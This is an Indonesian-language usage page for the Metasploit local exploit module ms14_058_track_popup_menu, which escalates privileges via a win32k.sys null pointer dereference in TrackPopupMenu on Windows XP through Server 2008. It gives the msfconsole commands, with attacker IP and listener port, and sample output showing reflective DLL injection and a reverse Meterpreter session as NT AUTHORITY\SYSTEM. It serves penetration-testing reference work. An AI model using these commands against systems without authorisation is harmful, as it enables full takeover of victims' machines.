# ms14_058_track_popup_menu

Modul ini mengeksploitasi `Null Pointer Dereference` pada `win32k.sys`. Kerentanan ini dapat dipicu melalui penggunaan fungsi `TrackPopupMenu`. Dalam kondisi tertentu, `null pointer dereference` ini dapat disalahgunakan pada `xxxSendMessageTimeout` untuk mencapai eksekusi kode sewenang-wenang (`arbitrary code execution`).

Modul ini telah berhasil diuji pada:
- `Windows XP SP3`
- `Windows Server 2003 SP2`
- `Windows 7 SP1` (`32-bit` dan `64-bit`)
- `Windows Server 2008` (`32-bit` dan `R2 SP1 64-bit`)

## Penulis
- Unknown
- [juan vazquez](juan.vazquez@metasploit.com) 
- [Spencer McIntyre](https://github.com/zerosteiner)
- [OJ Reeves](oj@buffered.io) 

## Platform
- `Windows`

## Arsitektur
- `x86`, `x64`

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/ms14_058_track_popup_menu'
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] win32k.sys file version: 6.1.7601.17514 branch: 17
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 4352 launched.
[*] Reflectively injecting the DLL into 4352...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 192.168.1.53
[*] Meterpreter session 15 opened (192.168.1.11:4444 -> 192.168.1.53:49162) at 2025-05-17 05:58:24 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_058_track_popup_menu/)
